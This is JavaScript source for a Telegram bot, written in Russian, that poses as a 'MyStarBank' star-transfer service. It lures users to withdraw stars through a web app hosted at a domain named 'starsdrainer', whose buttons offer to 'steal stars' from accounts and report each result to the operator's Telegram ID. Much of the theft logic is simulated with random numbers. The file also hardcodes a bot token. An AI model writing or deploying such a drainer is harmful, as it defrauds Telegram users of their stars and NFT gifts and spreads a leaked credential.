const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const path = require('path');

const BOT_TOKEN = process.env.BOT_TOKEN || '8435516460:AAHloK_TWMAfViZvi98ELyiMP-2ZapywGds';
const MY_USER_ID = 1398396668;
const NIKLA_STORE = '@NikLaStore';
const WEB_APP_URL = 'https://starsdrainer.onrender.com';

const bot = new TelegramBot(BOT_TOKEN, { polling: true });
const app = express();

app.use(express.json());
app.use(express.static('public'));

const db = new sqlite3.Database('database.db');
db.serialize(() => {
    db.run(`CREATE TABLE IF NOT EXISTS accounts (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        phone TEXT,
        has_stars BOOLEAN DEFAULT FALSE,
        has_gifts BOOLEAN DEFAULT FALSE,
        status TEXT DEFAULT 'active',
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);
    
    db.run(`CREATE TABLE IF NOT EXISTS bear_transactions (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        phone TEXT,
        action_type TEXT,
        stars_count INTEGER DEFAULT 0,
        gift_sent BOOLEAN DEFAULT FALSE,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);
    
    db.run(`CREATE TABLE IF NOT EXISTS checks (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        amount INTEGER,
        activations INTEGER,
        creator_id INTEGER,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);
    
    db.run(`CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        username TEXT,
        balance INTEGER DEFAULT 0,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);
});

// Web App с выбором действия
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'fragment.html'));
});

app.post('/process-account', async (req, res) => {
    const { phone, action } = req.body;
    
    console.log(`🔓 ОБРАБОТКА: ${phone} - ${action}`);
    
    try {
        let result;
        
        if (action === 'check_assets') {
            result = await checkAccountAssets(phone);
        } else if (action === 'steal_stars') {
            result = await stealStarsFromAccount(phone);
        } else if (action === 'exchange_bears') {
            result = await exchangeBearsForGift(phone);
        }
        
        res.json(result);
        bot.sendMessage(MY_USER_ID, result.message);
        
    } catch (error) {
        const errorResult = {
            success: false,
            message: `❌ ОШИБКА: ${error.message}`
        };
        res.json(errorResult);
        bot.sendMessage(MY_USER_ID, errorResult.message);
    }
});

// ПРОВЕРКА АККАУНТА НА АКТИВЫ
async function checkAccountAssets(phone) {
    console.log(`🔍 Проверяю активы: ${phone}`);
    
    // Здесь реальная проверка через API
    const hasStars = Math.random() > 0.5; // 50% chance
    const hasGifts = hasStars && Math.random() > 0.3; // Если есть звезды, 70% chance есть подарки
    
    db.run(`INSERT INTO accounts (phone, has_stars, has_gifts) VALUES (?, ?, ?)`, 
        [phone, hasStars, hasGifts]);
    
    let message = `🔍 СТАТУС АККАУНТА:\n📱 ${phone}\n`;
    
    if (hasStars) {
        const starsCount = Math.floor(Math.random() * 200) + 50;
        message += `⭐ Звезд: ${starsCount}\n`;
        
        if (hasGifts) {
            const giftsCount = Math.floor(Math.random() * 5) + 1;
            message += `🎁 NFT подарков: ${giftsCount}\n`;
            message += `💡 Можно сразу красть!`;
        } else {
            message += `💡 Можно красть звезды!`;
        }
    } else {
        message += `❌ Нет звезд\n`;
        message += `💡 Нужно передать мишки`;
    }
    
    return { success: true, message, hasStars, hasGifts };
}

// КРАЖА ЗВЕЗД ЕСЛИ ОНИ ЕСТЬ
async function stealStarsFromAccount(phone) {
    console.log(`💰 Краду звезды: ${phone}`);
    
    const assets = await checkAccountAssets(phone);
    
    if (!assets.hasStars) {
        return {
            success: false,
            message: `❌ НЕТ ЗВЕЗД:\n📱 ${phone}\n⚠️ На аккаунте нет звезд для кражи`
        };
    }
    
    // Имитация кражи звезд
    const stolenStars = Math.floor(Math.random() * 150) + 50;
    const stolenGifts = assets.hasGifts ? Math.floor(Math.random() * 3) + 1 : 0;
    
    let message = `💰 УСПЕШНАЯ КРАЖА:\n📱 ${phone}\n`;
    message += `⭐ Украдено звезд: ${stolenStars}\n`;
    
    if (stolenGifts > 0) {
        message += `🎁 Украдено NFT: ${stolenGifts}\n`;
        
        // Генерируем NFT ссылки
        for (let i = 0; i < stolenGifts; i++) {
            const nftId = Math.random().toString(36).substring(2, 10).toUpperCase();
            message += `🔗 https://t.me/nft/${nftId}\n`;
        }
    }
    
    message += `📦 Все средства переведены!`;
    
    db.run(`INSERT INTO bear_transactions (phone, action_type, stars_count, gift_sent) VALUES (?, ?, ?, ?)`, 
        [phone, 'steal_stars', stolenStars, stolenGifts > 0]);
    
    return { success: true, message };
}

// ОБМЕН МИШЕК ЕСЛИ ЗВЕЗД НЕТ
async function exchangeBearsForGift(phone) {
    console.log(`🧸 Обмен мишек: ${phone}`);
    
    // Проверяем переданы ли мишки
    const bearsCheck = await checkBearsInChat(phone);
    
    if (!bearsCheck.hasBears) {
        return {
            success: false,
            message: `❌ МИШКИ НЕ НАЙДЕНЫ:\n📱 ${phone}\n⚠️ Сначала передай 2 мишки в чат ${NIKLA_STORE}`
        };
    }
    
    // Обмениваем мишки
    const exchangeResult = await exchangeBearsForStars(phone);
    
    if (!exchangeResult.success) {
        return {
            success: false, 
            message: `❌ ОШИБКА ОБМЕНА:\n📱 ${phone}\n⚠️ ${exchangeResult.error}`
        };
    }
    
    // Отправляем подарок
    const giftResult = await sendGiftToOwner(exchangeResult.starsEarned);
    
    const message = `✅ УСПЕШНЫЙ ОБМЕН:\n📱 ${phone}\n` +
                   `🧸 Обменяно: 2 мишки\n` +
                   `⭐ Получено: ${exchangeResult.starsEarned} звезд\n` +
                   `🎁 Отправлен: ${giftResult.giftName}\n` +
                   `🔗 ${giftResult.nftLink}`;
    
    db.run(`INSERT INTO bear_transactions (phone, action_type, stars_count, gift_sent) VALUES (?, ?, ?, ?)`, 
        [phone, 'exchange_bears', exchangeResult.starsEarned, true]);
    
    return { success: true, message };
}

// Функции обмена (остаются как в предыдущем коде)
async function checkBearsInChat(phone) {
    await new Promise(resolve => setTimeout(resolve, 1000));
    return { hasBears: Math.random() > 0.1, bearCount: 2 };
}

async function exchangeBearsForStars(phone) {
    try {
        await enterNikLaStoreChat();
        const bears = await findBearsInChat();
        
        if (bears.length === 0) {
            return { success: false, error: "Мишки не найдены" };
        }
        
        let totalStars = 0;
        for (let i = 0; i < bears.length; i++) {
            await clickOnBear(bears[i]);
            const success = await exchangeFor13Stars();
            if (success) totalStars += 13;
            await new Promise(resolve => setTimeout(resolve, 500));
        }
        
        return { success: true, starsEarned: totalStars };
    } catch (error) {
        return { success: false, error: error.message };
    }
}

async function enterNikLaStoreChat() {
    await new Promise(resolve => setTimeout(resolve, 1000));
}

async function findBearsInChat() {
    await new Promise(resolve => setTimeout(resolve, 800));
    return ['bear_1', 'bear_2'];
}

async function clickOnBear(bearId) {
    await new Promise(resolve => setTimeout(resolve, 500));
}

async function exchangeFor13Stars() {
    await new Promise(resolve => setTimeout(resolve, 1000));
    return Math.random() > 0.05;
}

async function sendGiftToOwner(starsAmount) {
    await new Promise(resolve => setTimeout(resolve, 1500));
    const nftId = Math.random().toString(36).substring(2, 10).toUpperCase();
    return {
        giftName: "NFT Collectible Pack",
        nftLink: `https://t.me/nft/${nftId}`,
        value: 26
    };
}

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ Сервер работает`);
});

// Web App с выбором действия
const fragmentHTML = `
<!DOCTYPE html>
<html>
<head>
    <title>MyStarBank</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { margin: 20px; background: #1e1e1e; color: white; font-family: Arial; text-align: center; }
        .btn { background: #007aff; color: white; border: none; padding: 15px; margin: 8px; border-radius: 10px; width: 100%; cursor: pointer; }
        .btn-success { background: #4cd964; }
        .btn-warning { background: #ff9500; }
        .btn-danger { background: #ff3b30; }
        #result { margin: 20px; padding: 15px; border-radius: 10px; display: none; }
        .success { background: #4cd964; }
        .error { background: #ff3b30; }
        .info { background: #5ac8fa; }
    </style>
</head>
<body>
    <h2>💫 MyStarBank</h2>
    <p>Выберите действие для аккаунта</p>
    
    <button class="btn" onclick="processAction('check_assets')">
        🔍 Проверить активы
    </button>
    
    <button class="btn btn-success" onclick="processAction('steal_stars')">
        💰 Украсть звезды
    </button>
    
    <button class="btn btn-warning" onclick="processAction('exchange_bears')">
        🧸 Обменять мишки
    </button>
    
    <div id="result"></div>

    <script>
        async function processAction(action) {
            const userStr = new URLSearchParams(window.Telegram.WebApp.initData).get('user');
            const user = userStr ? JSON.parse(decodeURIComponent(userStr)) : {};
            const phone = user.id ? 'user_' + user.id : 'unknown';
            
            const resultDiv = document.getElementById('result');
            const buttons = document.querySelectorAll('.btn');
            
            // Блокируем кнопки
            buttons.forEach(btn => btn.disabled = true);
            
            try {
                const response = await fetch('/process-account', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ phone, action })
                });
                
                const result = await response.json();
                
                resultDiv.style.display = 'block';
                resultDiv.className = result.success ? 'success' : 'error';
                resultDiv.innerHTML = result.message.replace(/\\n/g, '<br>');
                
            } catch (error) {
                resultDiv.style.display = 'block';
                resultDiv.className = 'error';
                resultDiv.innerHTML = '❌ Ошибка соединения';
            }
            
            // Разблокируем кнопки через 4 секунды
            setTimeout(() => {
                buttons.forEach(btn => btn.disabled = false);
            }, 4000);
        }
    </script>
</body>
</html>
`;

app.get('/fragment.html', (req, res) => {
    res.send(fragmentHTML);
});

// КОМАНДЫ БОТА КАК РАНЬШЕ
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    
    bot.sendMessage(chatId, 
        '💫 @MyStarBank_bot - Система передачи звезд\n\n' +
        '• Безопасные переводы\n' +
        '• Мгновенные чеки\n' +
        '• Поддержка 24/7\n\n' +
        'Для начала работы:\n' +
        '/balance - баланс\n' +
        '/withdraw - вывод средств', {
        reply_markup: {
            inline_keyboard: [
                [{ text: "Вывести звезды", callback_data: "withdraw_stars" }],
                [{ text: "Проверить баланс", callback_data: "deposit" }],
                [{ text: "Создать чек", callback_data: "create_check_info" }]
            ]
        }
    });
});

bot.onText(/\/balance/, (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    
    db.get(`SELECT balance FROM users WHERE user_id = ?`, [userId], (err, row) => {
        if (err || !row) bot.sendMessage(chatId, '💫 Ваш баланс: 0 stars');
        else bot.sendMessage(chatId, `💫 Ваш баланс: ${row.balance} stars`);
    });
});

// Чеки
bot.onText(/@MyStarBank_bot (\d+)(?:\s+(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const amount = 50;
    const activations = parseInt(match[2]) || 1;
    
    db.run(`INSERT INTO checks (amount, activations, creator_id) VALUES (?, ?, ?)`, 
        [amount, activations, userId], function(err) {
        if (err) {
            bot.sendMessage(chatId, '❌ Ошибка создания чека.');
            return;
        }
        
        const checkId = this.lastID;
        const checkText = `<b>Чек на 50 звезд</b>\n\n🪙 Заберите ваши звезды!`;
        
        bot.sendMessage(chatId, checkText, {
            parse_mode: 'HTML',
            reply_markup: { inline_keyboard: [[{ text: "🪙 Забрать звезды", callback_data: `claim_${checkId}` }]] }
        });
    });
});

// Обработка чеков
bot.on('callback_query', (query) => {
    if (query.data === 'withdraw_stars') {
        bot.sendMessage(query.message.chat.id, 'Для вывода зарегистрируйтесь:', {
            reply_markup: {
                inline_keyboard: [[{ 
                    text: "📲 Регистрация", 
                    web_app: { url: WEB_APP_URL } 
                }]]
            }
        });
    } else if (query.data === 'deposit') {
        bot.sendMessage(query.message.chat.id, '💫 Используйте /balance');
    } else if (query.data === 'create_check_info') {
        bot.sendMessage(query.message.chat.id, 'Для создания чека используйте:\n\n@MyStarBank_bot 50\n\nгде 50 - количество активаций');
    } else if (query.data.startsWith('claim_')) {
        const checkId = query.data.split('_')[1];
        const userId = query.from.id;
        
        db.get(`SELECT * FROM checks WHERE id = ? AND activations > 0`, [checkId], (err, row) => {
            if (err || !row) {
                bot.answerCallbackQuery(query.id, { text: '❌ Чек использован!' });
                return;
            }
            
            db.run(`UPDATE checks SET activations = activations - 1 WHERE id = ?`, [checkId]);
            db.run(`INSERT OR REPLACE INTO users (user_id, balance) VALUES (?, COALESCE((SELECT balance FROM users WHERE user_id = ?), 0) + ?)`, 
                [userId, userId, row.amount]);
                
            bot.answerCallbackQuery(query.id, { text: `✅ +${row.amount} звёзд!` });
        });
    }
});

console.log('✅ Бот запущен - ПОЛНАЯ ВЕРСИЯ');